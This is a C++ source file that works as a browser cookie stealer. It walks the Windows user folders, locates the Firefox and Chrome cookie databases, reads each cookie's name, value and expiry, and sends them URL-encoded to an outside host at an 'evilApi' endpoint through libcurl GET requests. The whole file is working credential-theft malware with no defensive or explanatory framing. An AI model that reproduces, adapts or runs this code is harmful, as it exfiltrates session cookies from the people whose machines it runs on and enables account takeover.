#include <iostream>
#include <stdio.h>
#include <curl/curl.h>
#include <string>

#include "SqliteWrapper.h"
#include "FilesystemWrapper.h">
#include "Cookie.h"
#include <boost/filesystem.hpp>
// "C:\\Users\\Peter\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\zyf0bi9h.default"
//0|id|INTEGER|0||1
//1|baseDomain|TEXT|0||0
//2|appId|INTEGER|0|0|0
//3|inBrowserElement|INTEGER|0|0|0
//4|name|TEXT|0||0
//5|value|TEXT|0||0
//6|host|TEXT|0||0
//7|path|TEXT|0||0
//8|expiry|INTEGER|0||0
//9|lastAccessed|INTEGER|0||0
//10|creationTime|INTEGER|0||0
//11|isSecure|INTEGER|0||0
//12|isHttpOnly|INTEGER|0||0

using namespace std;

std::string urlEncode(std::string p)
{
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    char *u = new char[p.length() + 1];
    strcpy(u, p.c_str());

    u = curl_easy_escape(curl, u, p.length());
    std::string newP = u;

    return newP;
}


void sendCurl(std::string p)
{
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, p.c_str());

        res = curl_easy_perform(curl);

        /* always cleanup */
        curl_easy_cleanup(curl);
    }
}


void pushCookies(std::vector<std::string> A)
{
    for(std::vector<std::string>::iterator i = A.begin() ; i!=A.end() ; i++) {

        std::vector<Cookie> a = SqliteWrapper::printCookies((*i).c_str(), 1);

        for(std::vector<Cookie>::iterator j = a.begin() ; j!=a.end();j++)
        {
            std::string req = "http://partyplant.eu/evilApi/index.php?insert=1";

            req.append("&name=");
            req.append(urlEncode((*j).name));

            req.append("&value=");
            req.append(urlEncode((*j).value));

            req.append("&expires=");
            req.append(urlEncode((*j).expires));

            sendCurl(req.c_str());
            cout << endl;
        }
    }
}

int main(void)
{
    FilesystemWrapper::getUsers("C:\\Users");
    FilesystemWrapper::getCookiePathsFirefox();
    FilesystemWrapper::getCookiePathsChrome();

    //FilesystemWrapper::print(FilesystemWrapper::Users);
    //FilesystemWrapper::print(FilesystemWrapper::CookiePathsFirefox);
    //FilesystemWrapper::print(FilesystemWrapper::CookiePathsChrome);

    pushCookies(FilesystemWrapper::CookiePathsFirefox);
    pushCookies(FilesystemWrapper::CookiePathsChrome);
  return 0;
}
